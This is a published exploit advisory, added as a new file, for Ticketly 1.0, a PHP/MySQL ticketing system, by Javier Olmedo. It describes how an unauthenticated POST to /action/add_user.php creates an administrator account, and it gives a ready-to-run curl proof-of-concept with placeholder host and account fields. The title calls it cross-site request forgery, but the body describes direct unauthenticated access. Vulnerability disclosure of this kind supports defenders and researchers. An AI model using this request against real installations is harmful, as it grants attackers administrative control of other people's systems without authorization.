@@ -1,0 +1,27 @@
+# Exploit Title: Ticketly 1.0 - Cross-Site Request Forgery (Add Admin)
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-11-19
+# Google Dork: N/A
+# Vendor: Abisoft (https://abisoftgt.net)
+# Software Link: https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql
+# Affected Version: 1.0
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: Windows & Ubuntu
+# Tested on: Win10x64 & Kali Linux
+# CVE: N/A
+# 4. References:
+# https://hackpuntes.com/cve-2018-18922-ticketly-1-0-escalacion-de-privilegios-crear-cuenta-administrador/
+  
+# 1. Technical Description:
+# Ticketly version 1.0 are affected by a privilege escalation vulnerability,
+# an attacker could create an administrator user account by sending a POST
+# request to the resource /action/add_user.php without authentication.
+
+# 2. Proof Of Concept (PoC):
+# Send request curl:
+curl -i -s -k  -X $'POST' \
+    -H $'Host: [HOST]' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Content-Length: 82' \
+    --data-binary $'name=[NAME]&lastname=[LASTNAME]&email=[EMAIL]&status=1&password=[PASS]' \
+    $'http://[PATH]/action/add_user.php'
